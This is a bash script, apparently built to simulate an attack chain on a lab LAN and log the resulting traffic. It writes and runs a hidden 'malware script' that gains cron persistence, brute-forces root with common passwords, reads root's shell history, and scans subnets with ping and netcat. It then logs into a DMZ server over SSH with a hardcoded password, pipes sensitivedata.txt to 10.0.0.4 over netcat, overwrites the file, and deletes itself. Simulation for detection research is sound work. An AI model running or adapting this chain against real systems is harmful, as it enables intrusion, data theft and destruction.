#!/bin/bash

### this script is being run by user account john on one of the LAN clients

echo "
#!/bin/bash

### malware script

### addds this script to cron to be scheduled at boot to get persistence
bash -c'cat >> /crontab.txt << EOF
* * * * * bash .test.sh &
EOF
$ crond -c /crontab.txt'

### cracking password, priv esc
# root password is root
declare -a StringArray=("admin" "123456" "azerty" "0000" "password" "qwerty" "root")
for val in ${StringArray[@]}; do
su - root <<! >/dev/null 2>&1
$val
ls -al > /dev/tty
!
done

### persistence
su - root <<! >/dev/null 2>&1
root
bash -c 'cat >> /crontab.txt << EOF
* * * * * bash .test.sh &
EOF
$ crond -c /crontab.txt'
!

### found creds, lateral movement
su - root <<! >/dev/null 2>&1
root
cat /root/.ash_history > /dev/tty
!

# ping / netcat scan network, discovery

echo "
is_alive_ping()
{
  echo "$(date) ping discovery" >> /home/john/phishingAttackTraffic.txt
  ping -c 1 $1 > /dev/null
  test=$?
  [ $test -eq 0 ] && echo $i | read ips
  for j in $(seq 1 1000)
  do
  echo "$(date) netcat discovery" >> /home/john/phishingAttackTraffic.txt
  [ $test -eq 0 ] && nc -n -z $i $j
  done
}

for i in 172.16.0.{1..255}
do
is_alive_ping $i
done

is_alive_ping2()
{
  echo "$(date) ping discovery" >> /home/john/phishingAttackTraffic.txt
  ping -c 1 $1 > /dev/null
  test=$?
  [ $test -eq 0 ] && echo $i
  for j in $(seq 1 1000)
  do
  echo "$(date) netcat discovery" >> /home/john/phishingAttackTraffic.txt
  [ $test -eq 0 ] && nc -n -z $i $j
  done
}

for i in 192.168.{1..255}.{1..255}
do
is_alive_ping2 $i
done
echo 'done with .test2.sh'
" > .test2.sh

bash .test2.sh

sleep 1

# found ssh commando in command log
### collect ftp data, collection
echo "$(date) ssh collection Server2-control_ftp-DMZ_data" >> /home/john/phishingAttackTraffic.txt
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'ls /*'
echo "$(date) ssh collection Server2-control_ftp-DMZ_data" >> phishingAttackTraffic.txt
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'cat /home/sshuser/sensitivedata.txt'

### download data exfiltration
echo "$(date) ssh exfiltration Server2-control_ftp-DMZ_data" >> /home/john/phishingAttackTraffic.txt
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'cat /home/sshuser/sensitivedata.txt | nc 10.0.0.4 5555'

### delete of encrypt data impact
echo "$(date) ssh impact Server2-control_ftp-DMZ_data" >> /home/john/phishingAttackTraffic.txt
sshpass -p sshuserpassword ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no  sshuser@172.16.0.3 -C 'echo "fake sensitivedata" > /home/sshuser/sensitivedata.txt'

" > .test.sh

bash .test.sh & 

rm -f malware.sh